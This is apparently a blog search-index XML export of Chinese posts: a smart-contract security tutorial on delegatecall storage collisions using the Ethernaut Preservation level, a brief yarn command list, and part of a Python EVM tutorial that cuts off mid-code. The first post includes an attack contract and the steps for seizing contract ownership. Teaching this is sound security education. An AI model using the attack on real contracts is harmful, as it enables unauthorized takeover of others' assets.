<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>区块链骇客第五讲-委托调用攻击</title>
    <link href="/2022/11/28/%E5%8C%BA%E5%9D%97%E9%93%BE%E9%AA%87%E5%AE%A2%E7%AC%AC%E4%BA%94%E8%AE%B2-%E5%A7%94%E6%89%98%E8%B0%83%E7%94%A8%E6%94%BB%E5%87%BB/"/>
    <url>/2022/11/28/%E5%8C%BA%E5%9D%97%E9%93%BE%E9%AA%87%E5%AE%A2%E7%AC%AC%E4%BA%94%E8%AE%B2-%E5%A7%94%E6%89%98%E8%B0%83%E7%94%A8%E6%94%BB%E5%87%BB/</url>
    
    <content type="html"><![CDATA[<blockquote><p>本篇文章是call注入攻击的姊妹篇，为啥这么说呢？</p><p>因为委托调用攻击核心函数便是 delegatecall()</p><p>难度：偏难，但理解了就非常简单</p></blockquote><h2 id="📕1-挑战？"><a href="#📕1-挑战？" class="headerlink" title="📕1. 挑战？"></a>📕1. 挑战？</h2><ul><li>这是<code>Ethernaut</code>中的第十六个例子（已修改）</li><li><strong>现在把需求交给你</strong>：将合约<code>Preservation</code>的所有权拿到手。</li><li>你会先想到什么？这个例子非常典型</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.6.0;<br><br>contract Preservation &#123;<br><br>  // public library contracts <br>  address public timeZone1Library;<br>  address public timeZone2Library;<br>  address public owner; <br>  uint storedTime;<br>  // Sets the function signature for delegatecall<br>  bytes4 constant setTimeSignature = bytes4(keccak256(&quot;setTime(uint256)&quot;));<br><br>  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) public &#123;<br>    timeZone1Library = _timeZone1LibraryAddress; <br>    timeZone2Library = _timeZone2LibraryAddress; <br>    owner = msg.sender;<br>  &#125;<br> <br>  // set the time for timezone 1<br>  function setFirstTime(uint _timeStamp) public &#123;<br>    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));<br>  &#125;<br><br>  // set the time for timezone 2<br>  function setSecondTime(uint _timeStamp) public &#123;<br>    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));<br>  &#125;<br>&#125;<br><br>// Simple library contract to set the time<br>contract LibraryContract &#123;<br><br>  // stores a timestamp <br>  uint storedTime;  <br><br>  function setTime(uint _time) public &#123;<br>    storedTime = _time;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="📕2-了解delegatecall"><a href="#📕2-了解delegatecall" class="headerlink" title="📕2.了解delegatecall ()"></a>📕2.了解delegatecall ()</h2><p><code>delegatecall()</code>和<code>call()</code>是姊妹函数，它们都是调用函数的底层用法，因此在安全层面上是不严谨的。</p><p>🌳官方文档是这么描述这个函数的：</p><blockquote><p>“除了目标地址上的代码在调用合约的上下文中执行以及 msg.sender 和 msg.value 不更改它们的值这一事实之外，与消息调用是相同的。</p><p>这意味着合约可以在运行时从不同的地址动态加载代码。存储、当前地址和余额仍然是指调用合约，只有代码是从被调用的地址。”</p></blockquote><p><mark>官方文档写的太抽象，我来举个例子方便大家理解：</mark></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract Example&#123;<br><br>    address public calledContract;<br>    <br>    constructor(address _calledContract)&#123;<br>       this.calledContract = _calledContract;<br>    &#125;<br>    <br>    function useDelegatecall(address _change) public &#123;<br>        calledContract.delegatecall(abi.encodePacked(bytes4(keccak256(&quot;changeAddress(address)&quot;)),_change))<br>    &#125;<br>&#125;<br><br><br>contract CalledContract&#123;<br>   address public initAddress;<br>   <br>   function changeAddress(address _changeAddress)&#123;<br>   this.initAddress = _changeAddress;<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="🚀解析例子"><a href="#🚀解析例子" class="headerlink" title="🚀解析例子"></a>🚀解析例子</h3><ul><li><p><code>contract Example</code>：主合约</p></li><li><p><code>contract CalledContract</code>：被调用合约</p></li><li><p><code>address public calledContract</code>：被调用合约地址</p></li></ul><blockquote><p> 可以看到在函数<code>useDelegatecall</code>中，我们使用了<code>delegatecall()</code>调用了被调用合约的<code>changeAddress()</code>函数，并且传入了参数<code>_change</code>。</p></blockquote><p>调用成功后我们查看结果：</p><blockquote><p>被调用合约中的<code>initAddress</code>并未修改成传入的地址参数<code>_change</code>，反而主合约的<code>calledContract</code>变成了<code>_change</code>.</p></blockquote><h3 id="🎹离谱吗"><a href="#🎹离谱吗" class="headerlink" title="🎹离谱吗"></a>🎹离谱吗</h3><p>而这正是<code>delegatecall()</code>的安全漏洞：</p><p><mark><strong>被调用合约的上下文仍然是主合约的上下文</strong></mark>，包括<code>msg.value</code>、<code>msg.sender</code> 以及 <code>storage</code>。因此当我们以为修改的是合约<code>CalledContract</code>的<mark>第一插槽</mark>（不了解插槽的去看上一讲）实际上我们修改的是合约<code>Example</code>的第一插槽，即<code>address calledContract</code>。</p><p>这就是<code>delegatecall()</code>函数真正的妙处，同样也是极大的安全漏洞！</p><hr><h2 id="📕研究合约"><a href="#📕研究合约" class="headerlink" title="📕研究合约"></a>📕研究合约</h2><blockquote><p>那么以上的使用方法，如何去破解开头给出的合约呢？</p><p>我想聪明的你早就有了一些想法。</p></blockquote><h3 id="💎回到合约"><a href="#💎回到合约" class="headerlink" title="💎回到合约"></a>💎回到合约</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.6.0;<br><br>contract Preservation &#123;<br><br>  // public library contracts <br>  address public timeZone1Library;<br>  address public timeZone2Library;<br>  address public owner; <br>  uint storedTime;<br>  // Sets the function signature for delegatecall<br>  bytes4 constant setTimeSignature = bytes4(keccak256(&quot;setTime(uint256)&quot;));<br><br>  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) public &#123;<br>    timeZone1Library = _timeZone1LibraryAddress; <br>    timeZone2Library = _timeZone2LibraryAddress; <br>    owner = msg.sender;<br>  &#125;<br> <br>  // set the time for timezone 1<br>  function setFirstTime(uint _timeStamp) public &#123;<br>    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));<br>  &#125;<br><br>  // set the time for timezone 2<br>  function setSecondTime(uint _timeStamp) public &#123;<br>    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));<br>  &#125;<br>&#125;<br><br>// Simple library contract to set the time<br>contract LibraryContract &#123;<br><br>  // stores a timestamp <br>  uint storedTime;  <br><br>  function setTime(uint _time) public &#123;<br>    storedTime = _time;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><code>Preservation</code>：主合约</li><li><code>timeZone1Library</code>,<code>timeZone2Library</code>：两个外部调用合约地址，即本例中的<code>LibraryContract</code></li><li><code>setTimeSignature</code>：函数签名，可以通过call或delegatecall等底层方法调用函数。</li></ul><h3 id="💎偷天换日"><a href="#💎偷天换日" class="headerlink" title="💎偷天换日"></a>💎偷天换日</h3><blockquote><p>当调用主合约函数<code>setFirstTime</code>时，将会调用外部合约<code>LibraryContract</code>的<code>setTime</code>方法，在该方法中修改了此合约的<mark>第一插槽</mark>,根据<code>delegatecall()</code>的特性，真正被修改的其实是主合约的<mark>第一插槽！</mark>，即<code>timeZone1Library</code>.</p></blockquote><blockquote><p>因此我们可以借助该漏洞替换掉主合约的<code>timeZone1Library</code>或者是<code>timeZone2Library</code>，再一次根据·<code>delegatecall()</code>的特性替换掉主合约的<code>owner</code>.</p></blockquote><h3 id="💎伪造攻击合约"><a href="#💎伪造攻击合约" class="headerlink" title="💎伪造攻击合约"></a>💎伪造攻击合约</h3><blockquote><p>那么被我们替换掉的攻击合约应该是什么样的呢？</p></blockquote><p>为了完美利用<code>delegatecall()</code>的特性，它应该满足一下所有的需求：</p><ul><li>存储结构应该与主合约一致</li><li>应该拥有与<code>setTime()</code>同名的函数</li><li>应该在<code>setiTime()</code>函数中修改<mark>第三插槽</mark>的内存，也就是主合约中<code>owner</code>所在的存储位置。</li></ul><p>因此，这个合约应该长这样：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br><br>contract AttackPreservation &#123;<br><br>  //必须拥有相同的存储结构！<br>  address public timeZone1Library;<br>  address public timeZone2Library;<br>  address public owner; <br>  <br>  <br>  //同名函数<br>  function setTime(uint _change) public &#123;<br>     owner = address(_change);<br>  &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>至此，用于替换的攻击合约就已经编写好了。</p><p>当调用该攻击合约的<code>setTime()</code>函数之时，我们将合约中owner（第三插槽）替换成了传入的变量。</p><p>实际上修改的是主合约的<code>owner</code>变量，因此将调用传入的参数改成自己的钱包地址即可！</p><h3 id="💎攻击流程"><a href="#💎攻击流程" class="headerlink" title="💎攻击流程"></a>💎攻击流程</h3><ol><li>伪造用于替换<code>timeZone1Library</code>的攻击合约；</li><li>首次调用<code>setFirstTime()</code>函数，将传入参数设为用于替换的攻击合约的地址；</li><li>第二次调用<code>setFirstTime()</code>函数，将传入参数设为自己的钱包地址；</li><li>完成攻击，将合约拥有者修改成了自己</li></ol><h2 id="📕总结"><a href="#📕总结" class="headerlink" title="📕总结"></a>📕总结</h2><blockquote><p>delegatecall()是一种危险性极高的函数调用方式，因此在平时的合约编写中，非必要不要用到该调用方式。</p><p>并且随着solidity语言版本的迭代更新，delegatecall()已经被逐步禁用。</p><p>不要觉得这些知识学了无用，在今后的学习中，会基于这样的分析模式深入地解决问题！</p></blockquote><p>恭喜你！通过了这一章的学习。</p><p>至此你已经初步了解了基于函数特性的技术性安全漏洞。</p><p>在接下来的学习中，我会涉及到新型的合约攻击方式，请持续关注我！</p><h3 id="🌳参考文献"><a href="#🌳参考文献" class="headerlink" title="🌳参考文献"></a>🌳参考文献</h3><p><a href="https://blog.sigmaprime.io/solidity-security.html#delegatecall">blog.sigmaprime-delegatecall</a></p><p><a href="https://swcregistry.io/docs/SWC-112">SWC-112</a></p><p><a href="https://medium.com/loom-network/how-to-secure-your-smart-contracts-6-solidity-vulnerabilities-and-how-to-avoid-them-part-1-c33048d4d17d">How to Secure Your Smart Contracts: 6 Solidity Vulnerabilities and how to avoid them (Part 1)</a></p><p><a href="https://docs.soliditylang.org/en/latest/introduction-to-smart-contracts.html#delegatecall-callcode-and-libraries">官方文档-delegatecall</a></p>]]></content>
    
    
    <categories>
      
      <category>区块链骇客</category>
      
    </categories>
    
    
    <tags>
      
      <tag>合约安全审计</tag>
      
      <tag>delegatecall</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2022/11/20/yarn%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/"/>
    <url>/2022/11/20/yarn%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/</url>
    
    <content type="html"><![CDATA[<h1 id="yarn基本操作"><a href="#yarn基本操作" class="headerlink" title="yarn基本操作"></a>yarn基本操作</h1><h2 id="workplace工作区"><a href="#workplace工作区" class="headerlink" title="workplace工作区"></a>workplace工作区</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">查看工作区详情</span><br>yarn workspaces info/list<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">选定工作区安装</span><br>yarn workspace &lt;package-name&gt; add ...<br></code></pre></td></tr></table></figure><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">直接安装当前文件夹中package.json的依赖</span><br>yarn install<br><span class="hljs-meta prompt_">#</span><span class="language-bash">过在项目中设置所需的版本</span><br>yarn set version 2.4.0 <br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>狠人！用Python从零敲出一个以太坊虚拟机-2</title>
    <link href="/2022/11/11/%E7%8B%A0%E4%BA%BA%EF%BC%81%E7%94%A8Python%E4%BB%8E%E9%9B%B6%E6%95%B2%E5%87%BA%E4%B8%80%E4%B8%AA%E4%BB%A5%E5%A4%AA%E5%9D%8A%E8%99%9A%E6%8B%9F%E6%9C%BA-2/"/>
    <url>/2022/11/11/%E7%8B%A0%E4%BA%BA%EF%BC%81%E7%94%A8Python%E4%BB%8E%E9%9B%B6%E6%95%B2%E5%87%BA%E4%B8%80%E4%B8%AA%E4%BB%A5%E5%A4%AA%E5%9D%8A%E8%99%9A%E6%8B%9F%E6%9C%BA-2/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="📕介绍"><a href="#📕介绍" class="headerlink" title="📕介绍"></a>📕介绍</h2><p>在这一部分，我们将拓展指令集，重点在于：</p><ul><li>分支指令</li><li>循环和条件</li><li>跳转目的验证</li><li>堆栈操作指令（<code>DUP</code>,<code>SWAP</code>,<code>PUSH</code>）</li></ul><p>让我们开始吧！</p><h2 id="🌳分支指令"><a href="#🌳分支指令" class="headerlink" title="🌳分支指令"></a>🌳分支指令</h2><p>这些指令允许我们操作程序计数器，即下一条要运行的指令在代码缓冲区中的位置：</p><p><img src="/2022/11/11/%E7%8B%A0%E4%BA%BA%EF%BC%81%E7%94%A8Python%E4%BB%8E%E9%9B%B6%E6%95%B2%E5%87%BA%E4%B8%80%E4%B8%AA%E4%BB%A5%E5%A4%AA%E5%9D%8A%E8%99%9A%E6%8B%9F%E6%9C%BA-2/1.png"></p><p><code>JUMP</code> 从堆栈中弹出一项并且将程序设置成这个新值。</p><p><code>JUMPI</code>如果第二个参数（一个条件）不为零，则执行相同的操作，否则执行道吓一跳指令。</p><p>用我们简单明了的lambda风格来写这些是很诱人的：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">JUMP = instruction(<br>    <span class="hljs-number">0x56</span>,<br>    <span class="hljs-string">&quot;JUMP&quot;</span>,<br>    (<span class="hljs-keyword">lambda</span> ctx: ctx.set_program_counter(ctx.stack.pop()),<br>)<br></code></pre></td></tr></table></figure><p>然而，有一个陷阱！请记住，代码缓冲区是一个字节可寻址的ROM，我们的分支指令让我们跳转到…….缓冲区的一个字节。谁能说有一条有效的指令在哪个偏移量？如果每条指令都呢个整齐的放入一个字节，我们就不会有问题，但EVM上的情况并非如此。值得注意的是，PUSH指令的参数直接编码在代码缓冲区中，这使得它们的大小可变。</p><hr><p>最好用一个例子来解释的话，这是我们的代码缓冲区：</p><p><img src="/2022/11/11/%E7%8B%A0%E4%BA%BA%EF%BC%81%E7%94%A8Python%E4%BB%8E%E9%9B%B6%E6%95%B2%E5%87%BA%E4%B8%80%E4%B8%AA%E4%BB%A5%E5%A4%AA%E5%9D%8A%E8%99%9A%E6%8B%9F%E6%9C%BA-2/2.png"></p><p>它将被字节填充满：</p><p><img src="/2022/11/11/%E7%8B%A0%E4%BA%BA%EF%BC%81%E7%94%A8Python%E4%BB%8E%E9%9B%B6%E6%95%B2%E5%87%BA%E4%B8%80%E4%B8%AA%E4%BB%A5%E5%A4%AA%E5%9D%8A%E8%99%9A%E6%8B%9F%E6%9C%BA-2/3.png"></p><p>所对应的指令为：<br><img src="/2022/11/11/%E7%8B%A0%E4%BA%BA%EF%BC%81%E7%94%A8Python%E4%BB%8E%E9%9B%B6%E6%95%B2%E5%87%BA%E4%B8%80%E4%B8%AA%E4%BB%A5%E5%A4%AA%E5%9D%8A%E8%99%9A%E6%8B%9F%E6%9C%BA-2/4.png"></p><p>但是有些指令可以跨越多个字节:<br><img src="/2022/11/11/%E7%8B%A0%E4%BA%BA%EF%BC%81%E7%94%A8Python%E4%BB%8E%E9%9B%B6%E6%95%B2%E5%87%BA%E4%B8%80%E4%B8%AA%E4%BB%A5%E5%A4%AA%E5%9D%8A%E8%99%9A%E6%8B%9F%E6%9C%BA-2/5.png"></p><p>所以如果你在指令的中间jump的话，这将会出错：</p><p><img src="/2022/11/11/%E7%8B%A0%E4%BA%BA%EF%BC%81%E7%94%A8Python%E4%BB%8E%E9%9B%B6%E6%95%B2%E5%87%BA%E4%B8%80%E4%B8%AA%E4%BB%A5%E5%A4%AA%E5%9D%8A%E8%99%9A%E6%8B%9F%E6%9C%BA-2/6.png"></p><p>在这点上，你可能想知道为什么这很糟糕，我至少看到两个原因：</p><ul><li>这可能因为jump本身的问题，所以与其执行jump造成随机的穿插，还不如让其立刻奔溃；举个例子，如果你的代码中有一个PUSH1 FF，并且有人可以利用您的合约跳转到该FF字节，这将导致您的合约自毁；</li><li>jump也可以用来隐藏代码，封装在其他指令的数据组文件中。这将击溃etherscan中的合同点验证（可以绕过已经发布的Solidity源码来执行任意代码）</li></ul><p>考虑到至少有这两个情况发生并且并没有好的理由来支持随意地使用jump，以太坊地开发者们决定让其非法化，在下一部分我们可以看到它们是如何做的。</p><hr><h2 id="🌳跳跃指向合理性"><a href="#🌳跳跃指向合理性" class="headerlink" title="🌳跳跃指向合理性"></a>🌳跳跃指向合理性</h2><blockquote><p>基于我们现在已经知道的，黄皮书的以下部分将听起来很熟悉：</p></blockquote><p><img src="/2022/11/11/%E7%8B%A0%E4%BA%BA%EF%BC%81%E7%94%A8Python%E4%BB%8E%E9%9B%B6%E6%95%B2%E5%87%BA%E4%B8%80%E4%B8%AA%E4%BB%A5%E5%A4%AA%E5%9D%8A%E8%99%9A%E6%8B%9F%E6%9C%BA-2/7.png"></p><p>我们可以将此规范转换成一个简单的过程，在该过程中使用代码缓冲区并在该缓冲区中返回一组有效的跳跃目的地：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">valid_jump_destinations</span>(<span class="hljs-params">code: <span class="hljs-built_in">bytes</span></span>) -&gt; <span class="hljs-built_in">set</span>[<span class="hljs-built_in">int</span>]:<br>    jumpdests = <span class="hljs-built_in">set</span>()<br>    i = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> i &lt; <span class="hljs-built_in">len</span>(code):<br>        current_op = code[i]<br>        <span class="hljs-keyword">if</span> current_op == JUMPDEST.opcode:<br>            jumpdests.add(i)<br>        <span class="hljs-keyword">elif</span> PUSH1.opcode &lt;= current_op &lt;= PUSH32.opcode:<br>            i += current_op - PUSH1.opcode + <span class="hljs-number">1</span><br><br>        i += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> jumpdests<br></code></pre></td></tr></table></figure><p><code>JUMPEST</code> 是我们目前为止还没有遇到过的指令，它是干什么的呢？啥也不是！</p><p><img src="/2022/11/11/%E7%8B%A0%E4%BA%BA%EF%BC%81%E7%94%A8Python%E4%BB%8E%E9%9B%B6%E6%95%B2%E5%87%BA%E4%B8%80%E4%B8%AA%E4%BB%A5%E5%A4%AA%E5%9D%8A%E8%99%9A%E6%8B%9F%E6%9C%BA-2/8.png"></p><p>本质上，<code>JUMPEST</code>只是有效跳转目的地的标记。但值得注意的是，我们不能旨在运行时检查我们降落在代码缓冲区中恰好时JUMPEST（又称为0x5b）的位置上——我们需要提前从偏移量为0开始扫描代码缓冲区以查找这些操作码。在运行时，在跳转之后，我们需要检查我们降落的目的地是否是我们之前确定的有效目的地集的一部分。</p><p>总之，到目前为止，我们已经了解了关于jump指令的一些有趣的事情：</p><ul><li>我们只能跳转到指令边界处由<code>JUMPEST</code>标记的偏移量</li><li>我们不能评估一个<code>JUMP1</code>指令跳转目的地的有效性（即<code>cond==0</code>）</li><li>尽管我们可以使用常规指令落空代码缓存区的结尾（下一条指令隐式的为<code>STOP</code>），但我们不能跳过代码缓冲区的结尾</li></ul><h2 id="🥇第一个无限循环"><a href="#🥇第一个无限循环" class="headerlink" title="🥇第一个无限循环"></a>🥇第一个无限循环</h2><blockquote><p>我们终于有了跳跃，可以开始做一些有趣的事情了，比如条件和循环。让我们编写第一个无限循环来庆祝吧！！</p></blockquote><p><code>tests/test_jumps.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_infinite_loop</span>():<br>    <span class="hljs-comment"># 5b600056</span><br>    code = assemble([<br>        JUMPDEST,<br>        PUSH1, <span class="hljs-number">0</span>,<br>        JUMP<br>    ])<br>    <span class="hljs-keyword">with</span> pytest.raises(ExecutionLimitReached) <span class="hljs-keyword">as</span> excinfo:<br>        run(code, max_steps=<span class="hljs-number">100</span>)<br></code></pre></td></tr></table></figure><p>聪明的你应该会注意到，我引入了<code>max_steps</code>参数，以便实际限制我们运行代码的时间。当然，在真正的EVM上，这将会收到气体的限制，但我们的目前的EVM还没有这一点。</p><hr><h2 id="🥈条件循环"><a href="#🥈条件循环" class="headerlink" title="🥈条件循环"></a>🥈条件循环</h2><blockquote><p>作为最后一个挑战，让我们来尝试实现一下迭代计算四平方的小算法：</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">n = <span class="hljs-number">4</span><br>loops = n<br>result = <span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> loops != <span class="hljs-number">0</span>:<br>result += n<br>loops -= <span class="hljs-number">1</span><br><br><span class="hljs-comment"># should be n^2</span><br><span class="hljs-keyword">return</span> result<br></code></pre></td></tr></table></figure><p>如果用原有的指令字节码实现这个算法是很有挑战性的，所以为了让我们更加轻松，需要在原来的基础上再补充一个新的指令<code>DUP</code>：</p><ul><li><code>DUP1</code> 是一个指令，代表着复制堆栈最顶部的元素，<code>DUP2</code>代表着复制堆栈第二个元素，依此类推一直到<code>DUP16</code>。这对于读取深层堆栈变量很有用。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">DUP1 =  register_instruction(<span class="hljs-number">0x80</span>,<span class="hljs-string">&quot;DUP1&quot;</span>,lamdba ctx:ctx.stack.push(ctx.stack.peek(<span class="hljs-number">0</span>)))<br></code></pre></td></tr></table></figure><ul><li>堆栈的<code>peek</code>函数</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">peek</span>(<span class="hljs-params">self, i</span>) -&gt; <span class="hljs-built_in">int</span>:<br>      <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(self.stack) &lt;= i:<br>          <span class="hljs-keyword">raise</span> StackUnderflow()<br><br>      <span class="hljs-keyword">return</span> self.stack[-(i + <span class="hljs-number">1</span>)]<br></code></pre></td></tr></table></figure><ul><li><code>SWAP1</code>  是堆栈的函数，将堆栈顶部与堆栈的第二个元素交换，<code>SWAP2</code> 将堆栈顶部和堆栈第三个元素交换，依此类推一直到<code>SWAP16</code>。这对于读取深层堆栈变量很有用。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">swap</span>(<span class="hljs-params">self,i:<span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-literal">None</span>:<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(self.stack) &lt; i:<br>        <span class="hljs-keyword">raise</span> StackUnderflow()<br>        <br>    self.stack[-<span class="hljs-number">1</span>],self.stack[-i-<span class="hljs-number">1</span>] = self.stack[-i-<span class="hljs-number">1</span>],self.stack[-<span class="hljs-number">1</span>]<br></code></pre></td></tr></table></figure><ul><li><code>SUB</code> 这样我们可以减少循环计数：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">SUB = register_instruction(<span class="hljs-number">0x03</span>,<span class="hljs-string">&quot;SUB&quot;</span>,<span class="hljs-keyword">lambda</span> ctx: ctx.stack.pop() - ctx.stack.pop())<br></code></pre></td></tr></table></figure><p>测试代码如下：</p><p><code>tests/test_jumps.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_four_squared</span>():<br>    <span class="hljs-comment"># 60048060005b8160125760005360016000f35b8201906001900390600556</span><br>    code = assemble([<br>                    <span class="hljs-comment"># stack</span><br>        PUSH1, <span class="hljs-number">4</span>,   <span class="hljs-comment"># n=4</span><br>        DUP1,       <span class="hljs-comment"># n=4, loops=4</span><br>        PUSH1, <span class="hljs-number">0</span>,   <span class="hljs-comment"># n=4, loops=4, result=0</span><br><br>        <span class="hljs-comment"># loop_cond</span><br>        <span class="hljs-comment"># if loops != 0, jump to loop_body</span><br>        JUMPDEST,<br>        DUP2,       <span class="hljs-comment"># n, loops, result, loops</span><br>        PUSH1, <span class="hljs-number">18</span>,  <span class="hljs-comment"># n, loops, result, 